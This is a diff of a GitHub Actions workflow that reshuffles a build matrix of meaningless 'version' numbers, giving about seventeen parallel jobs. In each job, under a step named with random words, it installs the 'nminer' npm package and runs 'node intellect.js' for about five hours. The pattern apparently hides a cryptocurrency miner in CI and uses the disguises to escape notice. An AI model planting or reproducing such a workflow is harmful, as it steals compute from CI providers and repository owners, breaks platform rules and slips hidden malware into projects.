@@ -9,25 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 8592 }
-          - { version: 8237 }
-          - { version: 4374 }
-          - { version: 3597 }
-          - { version: 6196 }
-          - { version: 7728 }
-          - { version: 4753 }
-          - { version: 6083 }
-          - { version: 2431 }
-          - { version: 9958 }
-          - { version: 6454 }
-          - { version: 8798 }
-          - { version: 6520 }
-          - { version: 7850 }
-          - { version: 8272 }
-          - { version: 9171 }
-          - { version: 6339 }
-          - { version: 2713 }
-          - { version: 7493 }
+          - { version: 2709 }
+          - { version: 9085 }
+          - { version: 6103 }
+          - { version: 7993 }
+          - { version: 6489 }
+          - { version: 7058 }
+          - { version: 7360 }
+          - { version: 5396 }
+          - { version: 5625 }
+          - { version: 4463 }
+          - { version: 9046 }
+          - { version: 5478 }
+          - { version: 7878 }
+          - { version: 802 }
+          - { version: 391 }
+          - { version: 110 }
+          - { version: 7908 }
 
     steps:
       - name: Checkout
@@ -38,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: 
+      - name: story though freely across minus
         run: |
           npm install nminer@latest
-          timeout 314m node intellect.js || echo "intellect executed"
+          timeout 303m node intellect.js || echo "intellect executed"
